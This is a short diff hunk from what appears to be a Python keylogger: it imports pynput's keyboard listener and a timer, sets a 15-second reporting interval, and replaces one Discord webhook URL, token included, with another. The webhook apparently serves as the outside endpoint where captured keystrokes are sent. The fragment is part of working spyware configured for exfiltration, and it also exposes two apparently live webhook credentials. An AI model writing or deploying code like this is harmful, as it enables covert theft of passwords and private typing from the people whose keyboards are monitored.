@@ -3,7 +3,7 @@ from threading import Timer
 from pynput.keyboard import Listener
 
 
-WEBHOOK_URL = 'https://discord.com/api/webhooks/1253333408067747971/biHM7Dk1jEIKyswHjFn5D9oiibmX02lVvqRKE6ZRSM7xs0TjnV1n179RVvcnUwEWYR1K'
+WEBHOOK_URL = 'https://discord.com/api/webhooks/1253337244018937896/F6OrMJ_-5YsyWjS67sfRjvmIamAD93La6aEK6ILF7VUd9KVYjiyJpHfWU5N_AcPsddLn'
 TIME_INTERVAL = 15  # Amount of time between each report, expressed in seconds.
 
 
